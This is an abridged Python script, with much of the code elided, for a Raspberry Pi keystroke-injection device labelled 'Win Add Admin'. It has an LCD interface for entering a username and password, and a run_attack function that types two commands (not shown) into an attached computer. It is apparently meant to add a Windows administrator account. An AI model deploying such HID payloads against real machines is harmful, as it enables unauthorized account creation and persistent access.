...
def draw_ui(screen_state="main"):
    ...
    d.text((5, 5), "Win Add Admin", font=FONT_TITLE, fill="#00FF00")
...
def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_username_input, username_input_cursor_pos, current_password_input, password_input_cursor_pos
...
def run_attack():
    ...
    try:
        ...
        hid_helper.type_string(command1)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string(command2)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
...
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Win Add Admin.", file=sys.stderr)
        sys.exit(1)
    ...
    try:
        while running:
            if current_screen == "main":
                ...
                char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-" # Common username chars
                ...
                char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?" # Common password chars
        ...
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Win Add Admin payload finished.")
